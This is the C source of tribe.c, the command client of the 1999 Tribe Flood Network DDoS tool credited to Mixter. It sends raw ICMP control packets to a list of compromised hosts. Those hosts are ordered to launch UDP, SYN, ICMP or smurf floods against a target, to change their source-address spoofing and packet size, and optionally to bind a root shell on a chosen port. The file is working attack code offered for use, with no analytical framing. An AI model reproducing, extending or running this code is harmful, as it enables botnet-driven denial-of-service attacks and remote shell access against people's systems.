/* tribe.c - tribe flood network client
   (c) 1999 by Mixter - PRIVATE */

#include "config.h"
#include "tubby.h"

			/* #define RUSH for RUSH mode(tm): repeat all
			   requests ten times and do not wait for replies */

#define TRIES 3		/* retry contacting a host how many times?
			   each try takes 1.2 seconds */

void unf (char *);
void bleh (int);
void timeout (int);

FILE *laymuhr;
char nextip[64];
unsigned long host;

void
main (int argc, char **argv)
{
  char target[1024], p0rt[64];
  int RID = 0;
#ifndef RUSH
  char buf[1024];
  struct iphdr *ip = (struct iphdr *) buf;
  struct icmphdr *icmp = (struct icmphdr *) (buf + sizeof (struct iphdr));
  fd_set f;
#endif
  int i, lsock, responded, winkewinke;

  printf (shameless_self_promotion);
#ifdef RUSH
  printf ("[0;35m[5m\t[RUSH mode(tm) enabled][0m\n");
#else
  signal (SIGINT, bleh);
  signal (SIGALRM, timeout);
#endif
  if (argc < 3)
    unf (argv[0]);
  laymuhr = fopen (argv[1], "r");
  if (laymuhr == NULL)
    {
      printf ("ERROR reading IP list\n");
      unf (argv[0]);
    }
  winkewinke = atoi (argv[2]);
  if (winkewinke > 0 && argc < 4)
    unf (argv[0]);
  printf ("[1;37m");
  switch (winkewinke)
    {
    case -2:
      RID = ID_PSIZE;
      if (argc > 3)
	strncpy (target, argv[3], sizeof (target));
      else
	strncpy (target, "0", sizeof (target));
      printf ("[request: change packet size]\n");
      break;
    case -1:
      RID = ID_SWITCH;
      if (argc > 3)
	strncpy (target, argv[3], sizeof (target));
      else
	strncpy (target, "0", sizeof (target));
      printf ("[request: change spoofmask]\n");
      break;
    case 0:
      RID = ID_STOPIT;
      printf ("[request: stop and display status]\n");
      break;
    case 1:
      RID = ID_SENDUDP;
      strncpy (target, argv[3], sizeof (target));
      printf ("[request: udp flood %s]\n", target);
      break;
    case 2:
      RID = ID_SENDSYN;
      if (argc < 5)
	unf (argv[0]);
      strncpy (target, argv[3], sizeof (target));
      strncpy (p0rt, argv[4], sizeof (p0rt));
      printf ("[request: syn flood [port: %s] %s]\n", p0rt, target);
      break;
    case 3:
      RID = ID_ICMP;
      strncpy (target, argv[3], sizeof (target));
      printf ("[request: icmp flood %s]\n", target);
      break;
#ifdef ID_SHELL
    case 4:
      RID = ID_SHELL;
      strncpy (target, argv[3], sizeof (target));
      printf ("[request: bind shell to port %s]\n", target);
      break;
#endif
    case 5:
      RID = ID_SMURF;
      strncpy (target, argv[3], sizeof (target));
      printf ("[request: smurf (target@bcast@...) %s]\n", target);
      break;
    default:
      unf (argv[0]);
      break;
    }
  printf ("[0;0m");
  fflush (stdout);
  while (fgets (nextip, sizeof (nextip), laymuhr) != NULL)
    {
      if (nextip[0] == '\n')
	continue;
      if (!validip (nextip))
	continue;
      lsock = socket (AF_INET, SOCK_RAW, 1);
#ifndef RUSH
      printf ("[0m%s: [0;31m", nextip);
#endif
      host = inet_addr (nextip);
      fcntl (lsock, F_SETFL, O_NONBLOCK);
      fcntl (fileno (stdin), F_SETFL, O_NONBLOCK);
      responded = -(TRIES + 1);
      while (responded++ < 1)
	{
#ifdef RUSH
	  responded = 1;
#ifdef SUPER
	  for (i = 0; i < 20; i++)
#else
	  for (i = 0; i < 10; usleep(i++))
#endif
#endif
	    switch (winkewinke)
	      {
	      case -2:
		send_connect (host, RID, target);
		break;
	      case -1:
		send_connect (host, RID, target);
		break;
	      case 0:
		send_connect (host, RID, ".");
		break;
	      case 1:
		send_connect (host, RID, target);
		break;
	      case 2:
		send_connect (host, ID_SYNPORT, p0rt);
		usleep (666);
		send_connect (host, RID, target);
		break;
	      case 3:
		send_connect (host, RID, target);
		break;
#ifdef ID_SHELL
	      case 4:
		send_connect (host, RID, target);
		break;
#endif
	      case 5:
		send_connect (host, RID, target);
		break;
	      default:
		unf (argv[0]);
		break;
	      }
#ifndef RUSH
	  fflush (stdout);
	  fflush (stdin);
	  FD_ZERO (&f);
	  FD_SET (fileno (stdin), &f);
	  FD_SET (lsock, &f);
	  alarm (5);
	  select (FD_SETSIZE, &f, NULL, NULL, NULL);
	  if (FD_ISSET (lsock, &f))
	    {
	      i = read (lsock, buf, 1024);
	      if (ip->saddr == host && icmp->type == 0 && ntohs (icmp->un.echo.id) == ID_ACK)
		{
		  show_shit (buf);
		  responded = 1;
		}
	    }
	  alarm (0);
	  if (responded == 0)
	    {
	      printf ("[0;34mtimeout\n");
	    }
	  if (responded > (-(TRIES - 1)) && responded < 0)
	    usleep (200000);
#endif
	}
      close (lsock);
    }
#ifndef RUSH
  printf ("[0m\n");
  fflush (stdout);
#endif
  return;
}

void
unf (char *haxor)
{
  printf ("[1;34m");
  printf ("usage: %s <iplist> <type> [ip] [port]\n", haxor);
  printf ("<iplist>     contains a list of numerical hosts that are ready to flood\n");
  printf ("<type>       -1 for spoofmask type (specify 0-3), -2 for packet size,\n");
  printf ("             is 0 for stop/status, 1 for udp, 2 for syn, 3 for icmp,\n");
#ifdef ID_SHELL
  printf ("             4 to bind a rootshell (specify port)\n");
#endif
  printf ("             5 to smurf, first ip is target, further ips are broadcasts\n");
  printf ("[ip]         target ip[s], separated by %s if more than one\n", DELIMITER);
  printf ("[port]       must be given for a syn flood, 0 = RANDOM\n\n");
  printf ("[0;0m");
  fflush (stdout);
  exit (-1);
}

void
bleh (int sighure)
{
  if (fgets (nextip, sizeof (nextip), laymuhr) == NULL)
    {
      printf ("[0m");
      exit (0);
    }
  else
    printf ("skipping\n");
  host = inet_addr (nextip);
  if (!validip (nextip))
    return;
  printf ("[0m%s: [0;31m", nextip);
  fflush (stdout);
}

void
timeout (int signo)
{
}
